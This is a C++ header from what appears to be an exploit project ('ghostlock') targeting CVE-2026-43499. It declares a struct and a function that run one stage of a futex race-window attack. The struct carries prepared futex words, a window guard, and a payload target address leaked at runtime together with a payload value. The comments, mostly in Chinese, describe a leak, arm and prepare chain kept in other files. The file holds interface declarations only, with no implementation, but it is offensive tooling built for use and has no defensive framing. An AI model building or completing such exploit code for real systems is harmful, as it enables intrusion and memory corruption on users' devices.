#pragma once
/** @file backend/cve_2026_43499/steps/window_runner.hpp
 *  把两件成品粘成一个执行体：阶段节奏（window_steps）跑在真尝试（window_attempt）上。
 *
 *  这一层只解决「边界」：两个已经准备好的 futex 字与窗口守卫由调用方给；
 *  字从哪里来（leak → arm → prepare 那套）不在本层，缺它们时本层会具名说缺。
 *
 *  设备专用（尝试要 linux/futex.h）。
 */
#include "backend/cve_2026_43499/seam/multicast_window.hpp"
#include "backend/cve_2026_43499/steps/window_attempt.hpp"
#include "backend/cve_2026_43499/steps/window_steps.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** What a stage is given besides its numbers: the two prepared words and the guard. */
    struct WindowStageContext final {
        std::uint32_t *chain = nullptr;
        std::uint32_t *target = nullptr;
        race::WindowGuard *window = nullptr;
        /** 引擎（调用方持有）："赢"的判据在它里面，本层只负责把上下文递进去。 */
        seam::RouteExec *route = nullptr;
        /** 载荷那一对：target 是运行时泄漏到的地址，value 来自文档。 */
        std::uint64_t payload_target = 0U;
        std::uint64_t payload_value = 0U;
    };

    /** Run one stage: attempt/settle/repair/rounds from @p request, the attempt from this unit"s
     *  real one. The caller fills @p request"s numbers and may override the settle hook (the
     *  default is the device"s sleep).
     *  @return nullptr when the stage won, or a named reason (step-words-unprepared when the two
     *  words or the guard are missing). */
    [[nodiscard]] const char *run_window_stage_with_attempt(WindowStep step, WindowStageRequest &request,
                                                            WindowStageContext &context) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::steps
